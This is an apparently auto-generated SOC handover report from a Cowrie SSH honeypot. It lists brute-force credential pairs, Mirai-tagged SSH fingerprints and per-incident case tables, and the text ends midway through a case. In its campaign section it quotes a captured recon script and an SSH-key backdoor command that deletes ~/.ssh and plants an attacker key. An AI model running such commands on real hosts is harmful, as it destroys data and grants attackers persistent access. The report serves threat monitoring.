# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-25 |
| **Generated At** | 2026-07-25T11:15:57Z |
| **Shift Time** | 11:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **326** |
| Confirmed Threats | **301** |
| False Positives Filtered | **25** (7.7%) |
| Unique Attacker IPs | **103** |
| Countries of Origin | **29** |
| High Severity Cases | **158** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **168** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **177** |
| Unique Credential Pairs | **122** |
| Unique Usernames | **25** |
| Unique Passwords | **109** |
| Successful Auth Pairs | **164** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 78 |
| `admin` | 20 |
| `test` | 10 |
| `user` | 7 |
| `345gs5662d34` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `admin` | 6 |
| `support` | 5 |
| `33333` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `support` | `support` | 5 |
| `admin` | `33333` | 5 |
| `operator` | `operator333` | 5 |
| `user` | `66666` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `66666` | `92.62.74.41` | 2026-07-25T08:57:32 |
| `user` | `66666` | `121.202.138.181` | 2026-07-25T08:57:45 |
| `user` | `66666` | `10.0.0.73` | 2026-07-25T08:57:57 |
| `root` | `﻿------fuck------` | `61.178.209.47` | 2026-07-25T09:01:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.46.25` | 2026-07-25T09:02:29 |
| `*1` | `$4` | `207.175.46.25` | 2026-07-25T09:02:38 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5562` | `207.175.46.25` | 2026-07-25T09:02:40 |
| `root` | `!root` | `92.118.39.77` | 2026-07-25T09:04:32 |
| `root` | `111111` | `92.118.39.77` | 2026-07-25T09:06:27 |
| `ubuntu` | `12345` | `49.124.153.33` | 2026-07-25T09:06:42 |
| `ubuntu` | `12345` | `124.88.174.143` | 2026-07-25T09:06:52 |
| `test` | `0000000` | `188.219.104.210` | 2026-07-25T09:07:54 |
| `root` | `123123` | `92.118.39.77` | 2026-07-25T09:08:22 |
| `root` | `root2005` | `14.49.197.174` | 2026-07-25T09:08:53 |
| `root` | `123321` | `92.118.39.77` | 2026-07-25T09:10:14 |
| `root` | `root2005` | `125.69.76.148` | 2026-07-25T09:11:59 |
| `root` | `1234` | `92.118.39.77` | 2026-07-25T09:12:09 |
| `root` | `12345` | `92.118.39.77` | 2026-07-25T09:14:01 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.136.59` | 2026-07-25T09:15:23 |
| `*1` | `$4` | `34.156.136.59` | 2026-07-25T09:15:36 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 6628` | `34.156.136.59` | 2026-07-25T09:15:38 |
| `root` | `1234567` | `92.118.39.77` | 2026-07-25T09:17:49 |
| `root` | `12345678` | `92.118.39.77` | 2026-07-25T09:19:47 |
| `root` | `123456789` | `92.118.39.77` | 2026-07-25T09:21:38 |
| `ubnt` | `ubnt777` | `65.20.191.231` | 2026-07-25T09:21:53 |
| `ubnt` | `ubnt777` | `65.20.138.46` | 2026-07-25T09:22:05 |
| `ubnt` | `ubnt777` | `10.0.0.73` | 2026-07-25T09:22:21 |
| `root` | `1234567890` | `92.118.39.77` | 2026-07-25T09:23:28 |
| `root` | `123456a` | `92.118.39.77` | 2026-07-25T09:25:20 |
| `support` | `support` | `176.53.159.196` | 2026-07-25T09:25:22 |
| `root` | `3edc@WSX!QAZ` | `45.195.221.26` | 2026-07-25T09:26:25 |
| `345gs5662d34` | `345gs5662d34` | `45.195.221.26` | 2026-07-25T09:26:28 |
| `root` | `3245gs5662d34` | `45.195.221.26` | 2026-07-25T09:26:29 |
| `support` | `support` | `10.0.0.73` | 2026-07-25T09:26:42 |
| `root` | `123456b` | `92.118.39.77` | 2026-07-25T09:27:12 |
| `user` | `6666` | `65.20.250.180` | 2026-07-25T09:27:39 |
| `root` | `1234abcd` | `92.118.39.77` | 2026-07-25T09:29:06 |
| `test` | `qwer1234!` | `187.210.77.105` | 2026-07-25T09:29:13 |
| `345gs5662d34` | `345gs5662d34` | `187.210.77.105` | 2026-07-25T09:29:15 |
| `test` | `3245gs5662d34` | `187.210.77.105` | 2026-07-25T09:29:16 |
| `admin` | `admin` | `116.99.170.251` | 2026-07-25T09:29:18 |
| `root` | `123abc` | `92.118.39.77` | 2026-07-25T09:31:08 |
| `admin` | `77` | `109.233.21.109` | 2026-07-25T09:32:29 |
| `root` | `admin` | `116.99.170.251` | 2026-07-25T09:32:30 |
| `root` | `123qwe` | `92.118.39.77` | 2026-07-25T09:33:05 |
| `installer` | `installer` | `116.99.170.251` | 2026-07-25T09:33:59 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-25T09:34:28 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-25T09:34:28 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-25T09:34:33 |
| `root` | `1q2w3e4r` | `92.118.39.77` | 2026-07-25T09:34:57 |
| `user` | `user` | `116.99.170.251` | 2026-07-25T09:34:59 |
| `config` | `config12345` | `10.0.0.73` | 2026-07-25T09:35:22 |
| `ubnt` | `ubnt` | `116.99.172.197` | 2026-07-25T09:35:40 |
| `root` | `1qaz2wsx` | `92.118.39.77` | 2026-07-25T09:36:58 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.246.179` | 2026-07-25T09:37:36 |
| `*1` | `$4` | `34.53.246.179` | 2026-07-25T09:37:49 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1824` | `34.53.246.179` | 2026-07-25T09:37:51 |
| `squid` | `squid` | `116.99.172.197` | 2026-07-25T09:38:35 |
| `root` | `1qaz@WSX` | `92.118.39.77` | 2026-07-25T09:39:01 |
| `root` | `21` | `92.118.39.77` | 2026-07-25T09:40:53 |
| `support` | `support` | `116.99.170.251` | 2026-07-25T09:41:59 |
| `config` | `config` | `116.99.170.251` | 2026-07-25T09:42:01 |
| `root` | `321` | `92.118.39.77` | 2026-07-25T09:42:47 |
| `root` | `4321` | `92.118.39.77` | 2026-07-25T09:44:41 |
| `root` | `@` | `116.99.172.197` | 2026-07-25T09:45:44 |
| `supervisor` | `supervisor777` | `64.72.74.162` | 2026-07-25T09:46:28 |
| `root` | `54321` | `92.118.39.77` | 2026-07-25T09:46:36 |
| `supervisor` | `supervisor777` | `60.172.54.36` | 2026-07-25T09:46:38 |
| `iot` | `iot` | `186.10.86.130` | 2026-07-25T09:47:04 |
| `345gs5662d34` | `345gs5662d34` | `186.10.86.130` | 2026-07-25T09:47:07 |
| `iot` | `3245gs5662d34` | `186.10.86.130` | 2026-07-25T09:47:08 |
| `root` | `555555` | `92.118.39.77` | 2026-07-25T09:48:36 |
| `root` | `654321` | `92.118.39.77` | 2026-07-25T09:50:42 |
| `admin` | `admin@123` | `116.99.170.251` | 2026-07-25T09:50:59 |
| `blank` | `333333` | `92.84.21.186` | 2026-07-25T09:52:13 |
| `root` | `7777777` | `92.118.39.77` | 2026-07-25T09:52:46 |
| `root` | `Bb123456789` | `103.20.97.75` | 2026-07-25T09:53:07 |
| `345gs5662d34` | `345gs5662d34` | `103.20.97.75` | 2026-07-25T09:53:12 |
| `root` | `3245gs5662d34` | `103.20.97.75` | 2026-07-25T09:53:13 |
| `admin` | `1qaz@WSX3edc` | `40.117.97.0` | 2026-07-25T09:53:34 |
| `345gs5662d34` | `345gs5662d34` | `40.117.97.0` | 2026-07-25T09:53:36 |
| `admin` | `3245gs5662d34` | `40.117.97.0` | 2026-07-25T09:53:36 |
| `root` | `root123` | `116.99.170.251` | 2026-07-25T09:53:54 |
| `root` | `Admin2026!` | `92.118.39.77` | 2026-07-25T09:54:42 |
| `default` | `default2018` | `95.79.57.221` | 2026-07-25T09:54:49 |
| `dev` | `d3v3l0p3r` | `129.121.75.215` | 2026-07-25T09:54:57 |
| `system` | `OkwKcECs8qJP2Z` | `116.99.172.197` | 2026-07-25T09:54:58 |
| `345gs5662d34` | `345gs5662d34` | `129.121.75.215` | 2026-07-25T09:54:58 |
| `dev` | `3245gs5662d34` | `129.121.75.215` | 2026-07-25T09:54:58 |
| `guest` | `guest` | `116.99.170.251` | 2026-07-25T09:55:35 |
| `blank` | `333333` | `10.0.0.73` | 2026-07-25T09:55:51 |
| `root` | `P4ssw0rd` | `92.118.39.77` | 2026-07-25T09:56:37 |
| `root` | `33` | `177.72.87.7` | 2026-07-25T09:56:53 |
| `root` | `P4ssword` | `92.118.39.77` | 2026-07-25T09:58:29 |
| `test` | `test` | `116.99.170.251` | 2026-07-25T09:58:30 |
| `default` | `default2018` | `10.0.0.73` | 2026-07-25T09:58:32 |
| `admin` | `0l0ctyQh243O63uD` | `116.99.170.251` | 2026-07-25T10:00:08 |
| `root` | `P@ssw0rd` | `92.118.39.77` | 2026-07-25T10:00:22 |
| `root` | `P@ssw0rd2026` | `92.118.39.77` | 2026-07-25T10:02:23 |
| `admin` | `password` | `116.99.172.197` | 2026-07-25T10:03:48 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-25T10:04:05 |
| `root` | `P@ssword` | `92.118.39.77` | 2026-07-25T10:04:25 |
| `admin` | `1234` | `116.99.172.197` | 2026-07-25T10:05:20 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-25T10:05:37 |
| `root` | `Passw0rd` | `92.118.39.77` | 2026-07-25T10:06:31 |
| `admin` | `33333` | `213.154.80.51` | 2026-07-25T10:07:40 |
| `admin` | `33333` | `116.114.94.242` | 2026-07-25T10:07:48 |
| `admin` | `admin01` | `116.99.170.251` | 2026-07-25T10:08:03 |
| `root` | `Password1` | `92.118.39.77` | 2026-07-25T10:08:32 |
| `admin` | `123456` | `116.99.170.251` | 2026-07-25T10:09:04 |
| `root` | `Root123` | `92.118.39.77` | 2026-07-25T10:10:24 |
| `admin` | `admin123` | `116.99.170.251` | 2026-07-25T10:10:44 |
| `admin` | `33333` | `112.94.5.43` | 2026-07-25T10:11:17 |
| `admin` | `33333` | `10.0.0.73` | 2026-07-25T10:11:31 |
| `admin` | `33333` | `210.4.68.73` | 2026-07-25T10:11:31 |
| `root` | `abc123` | `92.118.39.77` | 2026-07-25T10:12:13 |
| `ftp01` | `ftp01` | `118.193.40.61` | 2026-07-25T10:12:26 |
| `345gs5662d34` | `345gs5662d34` | `118.193.40.61` | 2026-07-25T10:12:30 |
| `ftp01` | `3245gs5662d34` | `118.193.40.61` | 2026-07-25T10:12:31 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-25T10:12:58 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-25T10:12:59 |
| `user` | `1234` | `116.99.172.197` | 2026-07-25T10:13:12 |
| `root` | `admin` | `92.118.39.77` | 2026-07-25T10:14:02 |
| `admin` | `default` | `116.99.170.251` | 2026-07-25T10:15:35 |
| `root` | `alpine` | `92.118.39.77` | 2026-07-25T10:15:55 |
| `config` | `8` | `203.252.10.3` | 2026-07-25T10:16:38 |
| `config` | `8` | `211.247.127.250` | 2026-07-25T10:16:47 |
| `ftp` | `ftp` | `116.99.170.251` | 2026-07-25T10:17:45 |
| `root` | `changeme` | `92.118.39.77` | 2026-07-25T10:17:48 |
| `test` | `test999` | `221.199.172.66` | 2026-07-25T10:18:00 |
| `test` | `test999` | `187.8.120.90` | 2026-07-25T10:18:07 |
| `root` | `default` | `92.118.39.77` | 2026-07-25T10:19:40 |
| `config` | `8` | `190.12.109.162` | 2026-07-25T10:20:02 |
| `config` | `8` | `211.169.212.206` | 2026-07-25T10:20:11 |
| `operator` | `operator` | `116.99.170.251` | 2026-07-25T10:21:10 |
| `test` | `test2011` | `10.0.0.73` | 2026-07-25T10:21:24 |
| `root` | `letmein` | `92.118.39.77` | 2026-07-25T10:21:42 |
| `test` | `test999` | `10.0.0.73` | 2026-07-25T10:21:57 |
| `root` | `p4ssword` | `92.118.39.77` | 2026-07-25T10:23:49 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-07-25T10:25:54 |
| `root` | `password` | `92.118.39.77` | 2026-07-25T10:27:48 |
| `root` | `qwerty` | `92.118.39.77` | 2026-07-25T10:29:43 |
| `root` | `qwerty123456` | `92.118.39.77` | 2026-07-25T10:31:33 |
| `operator` | `operator333` | `220.78.182.74` | 2026-07-25T10:32:01 |
| `operator` | `operator333` | `101.13.4.119` | 2026-07-25T10:32:10 |
| `root` | `r00t` | `92.118.39.77` | 2026-07-25T10:33:21 |
| `operator` | `operator333` | `103.67.152.201` | 2026-07-25T10:35:33 |
| `operator` | `operator333` | `112.26.101.76` | 2026-07-25T10:35:47 |
| `operator` | `operator333` | `10.0.0.73` | 2026-07-25T10:35:51 |
| `root` | `root!@#` | `92.118.39.77` | 2026-07-25T10:36:55 |
| `root` | `root#123` | `92.118.39.77` | 2026-07-25T10:38:41 |
| `root` | `root0000` | `92.118.39.77` | 2026-07-25T10:40:33 |
| `root` | `root1111` | `92.118.39.77` | 2026-07-25T10:42:31 |
| `ubuntu` | `P@ssword` | `123.129.245.249` | 2026-07-25T10:42:32 |
| `nobody` | `9999999` | `112.196.52.107` | 2026-07-25T10:44:20 |
| `root` | `root123` | `92.118.39.77` | 2026-07-25T10:44:24 |
| `nobody` | `9999999` | `122.169.97.132` | 2026-07-25T10:44:33 |
| `ubuntu` | `P@ssword` | `109.233.21.109` | 2026-07-25T10:45:46 |
| `ubuntu` | `P@ssword` | `14.97.77.182` | 2026-07-25T10:45:58 |
| `root` | `root1234` | `92.118.39.77` | 2026-07-25T10:46:17 |
| `root` | `root123456` | `92.118.39.77` | 2026-07-25T10:48:12 |
| `root` | `root2024` | `92.118.39.77` | 2026-07-25T10:50:04 |
| `root` | `root2025` | `92.118.39.77` | 2026-07-25T10:51:55 |
| `root` | `root2026` | `92.118.39.77` | 2026-07-25T10:53:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **326** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 69 |
| OpenSSH | 40 |
| libssh | 30 |
| AsyncSSH (Python) | 26 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 58 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 39 | 38 |
| `fda360b1b4f4...` | Mirai/variant | 26 | 2 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 58 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 39 | 38 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 26 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 56 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.75.215`, `40.117.97.0`, `186.10.86.130`, `45.195.221.26`, `118.193.40.61`, `187.210.77.105`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **103** |
| Unique ASNs | **60** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (158)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dfea3c0f149c

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-25 08:57 |
| **Last Seen** | 2026-07-25 08:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 08:57:30` | `cowrie.session.connect` |
| `2026-07-25 08:57:31` | `cowrie.client.version` |
| `2026-07-25 08:57:31` | `cowrie.client.kex` |
| `2026-07-25 08:57:32` | `cowrie.login.success` |
| `2026-07-25 08:57:33` | `cowrie.direct-tcpip.request` |
| `2026-07-25 08:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83c697d7144

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-07-25 08:57 |
| **Last Seen** | 2026-07-25 08:57 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 08:57:39` | `cowrie.session.connect` |
| `2026-07-25 08:57:40` | `cowrie.client.version` |
| `2026-07-25 08:57:40` | `cowrie.client.kex` |
| `2026-07-25 08:57:45` | `cowrie.login.success` |
| `2026-07-25 08:57:48` | `cowrie.direct-tcpip.request` |
| `2026-07-25 08:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafc87ff6027

| Field | Detail |
|---|---|
| **Source IP** | `61.178.209[.]47` |
| **First Seen** | 2026-07-25 09:01 |
| **Last Seen** | 2026-07-25 09:02 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:01:53` | `cowrie.session.connect` |
| `2026-07-25 09:01:54` | `cowrie.client.version` |
| `2026-07-25 09:01:55` | `cowrie.client.kex` |
| `2026-07-25 09:01:58` | `cowrie.login.success` |
| `2026-07-25 09:02:08` | `cowrie.session.params` |
| `2026-07-25 09:02:08` | `cowrie.command.input` |
| `2026-07-25 09:02:08` | `cowrie.log.closed` |
| `2026-07-25 09:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.178.209[.]47` to AbuseIPDB if not already reported
- [ ] Block `61.178.209[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb84082660b

| Field | Detail |
|---|---|
| **Source IP** | `207.175.46[.]25` |
| **First Seen** | 2026-07-25 09:02 |
| **Last Seen** | 2026-07-25 09:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:02:29` | `cowrie.session.connect` |
| `2026-07-25 09:02:29` | `cowrie.login.success` |
| `2026-07-25 09:02:30` | `cowrie.session.params` |
| `2026-07-25 09:02:30` | `cowrie.command.input` |
| `2026-07-25 09:02:30` | `cowrie.command.input` |
| `2026-07-25 09:02:30` | `cowrie.command.failed` |
| `2026-07-25 09:02:30` | `cowrie.command.input` |
| `2026-07-25 09:02:30` | `cowrie.log.closed` |
| `2026-07-25 09:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.46[.]25` to AbuseIPDB if not already reported
- [ ] Block `207.175.46[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b88fc99b12

| Field | Detail |
|---|---|
| **Source IP** | `207.175.46[.]25` |
| **First Seen** | 2026-07-25 09:02 |
| **Last Seen** | 2026-07-25 09:02 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:02:38` | `cowrie.session.connect` |
| `2026-07-25 09:02:38` | `cowrie.login.success` |
| `2026-07-25 09:02:38` | `cowrie.session.params` |
| `2026-07-25 09:02:38` | `cowrie.command.input` |
| `2026-07-25 09:02:38` | `cowrie.command.failed` |
| `2026-07-25 09:02:53` | `cowrie.log.closed` |
| `2026-07-25 09:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.46[.]25` to AbuseIPDB if not already reported
- [ ] Block `207.175.46[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb1b87ef4350

| Field | Detail |
|---|---|
| **Source IP** | `207.175.46[.]25` |
| **First Seen** | 2026-07-25 09:02 |
| **Last Seen** | 2026-07-25 09:02 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:02:40` | `cowrie.session.connect` |
| `2026-07-25 09:02:40` | `cowrie.login.success` |
| `2026-07-25 09:02:40` | `cowrie.session.params` |
| `2026-07-25 09:02:40` | `cowrie.command.input` |
| `2026-07-25 09:02:53` | `cowrie.log.closed` |
| `2026-07-25 09:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.46[.]25` to AbuseIPDB if not already reported
- [ ] Block `207.175.46[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9600837094b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:04 |
| **Last Seen** | 2026-07-25 09:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:04:29` | `cowrie.session.connect` |
| `2026-07-25 09:04:29` | `cowrie.client.version` |
| `2026-07-25 09:04:29` | `cowrie.client.kex` |
| `2026-07-25 09:04:32` | `cowrie.login.success` |
| `2026-07-25 09:04:34` | `cowrie.session.params` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.success` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.command.input` |
| `2026-07-25 09:04:34` | `cowrie.log.closed` |
| `2026-07-25 09:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89243c07ab63

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:06 |
| **Last Seen** | 2026-07-25 09:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
